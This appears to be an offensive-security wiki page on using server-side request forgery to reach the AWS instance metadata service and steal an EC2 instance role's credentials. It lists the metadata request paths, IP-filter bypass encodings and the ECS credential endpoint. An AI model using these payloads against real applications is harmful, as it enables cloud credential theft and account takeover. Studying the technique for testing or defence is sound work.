---
title: "SSRF: pulling instance credentials through a web app"
description: "Chaining a server-side request forgery to 169.254.169.254 to pull instance role credentials out of a web application."
keywords:
  - SSRF
  - 169.254.169.254
  - instance role
  - web application
  - metadata
---

# SSRF

When a web application running on EC2 can be coerced into making a request to an attacker-chosen URL, point it at the metadata endpoint and the response hands back the instance role's credentials. This is the bridge between a web vulnerability and full cloud credentials, and it is why [SSRF](../../../../web/code/injection/request-forgery/index.md) is treated as a cloud-credential technique.

## The core request

```
# any SSRF sink: image fetcher, webhook, URL preview, PDF renderer
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

On IMDSv2 the app must be coaxed into a `PUT` for the token and into sending the token header; see [IMDSv2](imdsv2.md). Where only a GET is possible, an instance left on [IMDSv1](imdsv1.md) returns credentials directly.

## Bypasses when the literal IP is filtered

```
http://169.254.169.254/      ->  http://[::ffff:169.254.169.254]/
                                  http://2852039166/            (decimal)
                                  http://metadata.google.internal (wrong cloud, but test)
# DNS rebinding and redirect-based bypasses where the fetcher follows 3xx
```

## Exploitation notes

- The web SSRF mechanics (sinks, filters, redirect and DNS-rebinding bypasses) live in [request forgery](../../../../web/code/injection/request-forgery/index.md); this page is only the AWS payload.
- ECS tasks expose credentials at `169.254.170.2` with a per-task path, a frequent SSRF target inside containers.

## Tools

- **Burp Suite** / custom scripts to drive the SSRF sink.
- **Pacu** once the stolen credentials are exported.

## References

- [HackTricks Cloud: SSRF to IMDS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [AWS: instance metadata service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
